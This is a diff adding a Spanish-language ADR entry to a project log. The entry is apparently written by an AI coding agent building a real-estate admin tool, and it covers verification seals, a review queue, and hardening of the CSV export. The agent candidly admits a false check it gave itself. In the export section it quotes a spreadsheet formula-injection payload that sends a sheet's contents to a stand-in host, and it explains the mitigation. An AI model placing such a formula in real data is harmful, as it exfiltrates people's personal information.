@@ -3961,3 +3961,61 @@ codebases · `build` · `verify:build` · `verify:data` · `verify:css`. Medido 
 tablas cuadran columna a columna, cero recortes, cero solapes, sin desborde. De paso se fueron dos
 clases de ancho que daban el mismo resultado. **Falta**: estrenar el camino con datos reales (paso
 1.5 del runbook, cuando exista el claim) y los adjuntos privados (gate B5 del dueño).
+
+---
+
+## 119. ADR — El sello, el export, y un «✅» que me di sin haber comparado nada ⟦OPUS-5⟧ (2026-08-22)
+
+Cierra TODO-44 (ítem 10 de la Ola 1: *«CRUD propiedades, cola de verificación, leads con SLA, export»*).
+
+**119.1 — El sello es una promesa, no una etiqueta.** «Verificado por ALTORRA» va al lado del precio
+en la ficha, y el eslogan del negocio es *«Seguridad, Legalidad y Confianza»*. A la primera propiedad
+sellada que resulte tener el área mal, el sello deja de valer para TODAS. Por eso
+`selloDeVerificacion` devuelve `null` en vez de sellar cuando no se lo ha ganado, y `cuerpoDeSello`
+**relee dentro de la transacción**: la cola puede llevar minutos en pantalla y en ese rato alguien
+pudo quitarle las fotos o sellarla desde otro equipo. Escribe con `merge` — tres campos, no los
+treinta que la fila no cargó.
+
+**119.2 — Lo que el software NO comprueba, y por qué se dice.** Los reparos no incluyen «sin
+dirección», aunque el sello signifique que alguien fue a ver el inmueble: la dirección vive en
+`captaciones` —otra colección, PII, admin-only— y mirarla costaría **una lectura por fila de la
+cola**. El free-tier no se gasta en confirmar algo que de todos modos tiene que mirar la persona que
+sella. El software bloquea lo que puede ver; el juicio es humano, y queda escrito que lo es.
+
+**119.3 — La cola es una VISTA, no otra consulta.** Se deriva del mismo `Map` que llenó la lista:
+cero lecturas extra. Una segunda query sobre `propiedades` para enseñar un subconjunto de lo que ya
+tienes delante es el gasto que el free-tier no perdona (`20 §Blaze`).
+
+**119.4 — La inyección de fórmulas era el riesgo real del export** (CWE-1236). Excel y Sheets
+INTERPRETAN un campo que empieza por `=`, `+`, `-`, `@`, tabulador o CR. Alguien escribe
+`=HYPERLINK("http://malo/?d="&A1,"Ver")` en el nombre del formulario **público** y eso se ejecuta al
+abrir el export en el portátil del dueño, con SU sesión: es la vía clásica para exfiltrar una hoja
+entera desde un input de una web. Se antepone un apóstrofo en vez de borrar el carácter, porque un
+teléfono `+57 300…` es un dato legítimo que hay que conservar entero. Más BOM, o Excel en Windows
+rompe los acentos. El export de leads lleva **PII** y el nombre del archivo lo dice (Ley 1581): nadie
+debería encontrárselo en Descargas sin saber que son personas.
+
+**119.5 — Me di un ✅ inmerecido, en la misma sesión en que llevo dos ADRs describiéndolo.** Mi
+comprobación del layout dijo «✅ columnas cuadran» comparando `[0,0,0]` con `[0,0,0]`: el panel estaba
+oculto, nada tenía tamaño, y `0===0` aprueba. Es EXACTAMENTE el defecto que TODO-45(b) persigue en los
+gates del cerebro —*un gate que hace 0 comparaciones debe DEGRADAR, no aprobar*— cometido por mí,
+a mano, un rato después de escribirlo. La corrección es de una línea y ahora vive en la skill: **toda
+comprobación por medición necesita una guarda de medibilidad** antes de emitir veredicto.
+
+**119.6 — Y la causa de que estuviera oculto**: el panel de la cola aterrizó en la vista de
+NOVEDADES, porque mi script ancló en «el último `</div>` antes de la siguiente vista» y en ese
+archivo hay noventa iguales. Se movió anclando en `gx-inm-cuerpo` —único— y el script ahora verifica
+por POSICIÓN EN EL ARCHIVO que cayó entre las dos vistas correctas. Junto con [[L-47]] de hace una
+hora, dos daños distintos del mismo utillaje en la misma sesión.
+
+**119.7 — Tres nombres de campo adivinados, los tres mal**: `direccionExacta` y `areaConstruidaM2`
+no viven donde supuse, el estado publicado es `disponible` y no `publicado`, y el precio de venta es
+`precio.valorVenta`. Los tests lo cazaron en el primer intento, pero el modelo estaba a un `grep` de
+distancia: §3.3 no es una formalidad, es más rápido.
+
+**119.8 — Verificación.** 392 tests (24 nuevos) · `typecheck` en los dos codebases · `build` ·
+`verify:build` · `verify:data` · `verify:css`. Medido en el navegador CON la guarda puesta: columnas
+a 315/636/1071, filas de 73 y 71 px, botón de 44 px dentro de su fila, cero recortes, sin desborde;
+y el CSV generado de punta a punta con BOM, coma entrecomillada, comillas duplicadas, HYPERLINK
+neutralizado y teléfono intacto. Destilado a `arquitecto-software` (export de datos) y a
+`validacion-live-chrome` (la guarda de medibilidad).
